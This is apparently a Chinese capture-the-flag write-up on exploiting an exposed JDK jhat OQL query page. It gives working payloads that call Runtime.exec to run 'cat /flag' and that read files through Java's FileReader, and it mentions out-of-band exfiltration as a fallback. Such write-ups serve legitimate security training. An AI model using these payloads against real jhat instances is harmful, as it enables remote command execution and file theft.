# jhat

## 题目简述

目标暴露了 JDK `jhat` 的 Object Query Language（OQL）查询页面。OQL 并不只是静态搜索语法：旧版 `jhat` 使用脚本引擎执行表达式，并允许访问 Java 类。于是查询表达式可以调用 Java API，直接读取 `/flag` 或启动系统命令。

## 解题过程

进入 OQL 查询页后，可以通过 `Runtime.exec` 执行 `cat /flag`，再用 `Scanner` 读取进程标准输出：

```javascript
new java.util.Scanner(
    java.lang.Runtime.getRuntime().exec("cat /flag").getInputStream()
)
```

提交后，查询结果中会直接显示命令输出。无需启动子进程时，也可以用 Java 文件 API 读取首行：

```javascript
select new java.io.BufferedReader(
    new java.io.FileReader("/flag")
).readLine()
```

官方 PDF 第二种写法把 `java.io.FileReader` 误写成了 `java.o.FileReader`，这里已按实际 Java 包名修正。若页面不回显，也可以让命令把读取结果带到受控的 HTTP/DNS 端点，但本题具有直接回显，没必要依赖外部回连。

## 方法总结

- 核心技巧：利用 `jhat` OQL 对 Java 类的访问能力，在查询上下文中读文件或执行命令。
- 识别信号：页面标题为 `Object Query Language (OQL) query`，查询示例允许构造 Java 对象或调用方法。
- 复用要点：先尝试无副作用的文件读取；只有无回显时才考虑外带。OQL 的具体能力取决于 JDK 和脚本引擎版本，不能把所有同名查询语言都视为可执行 Java。
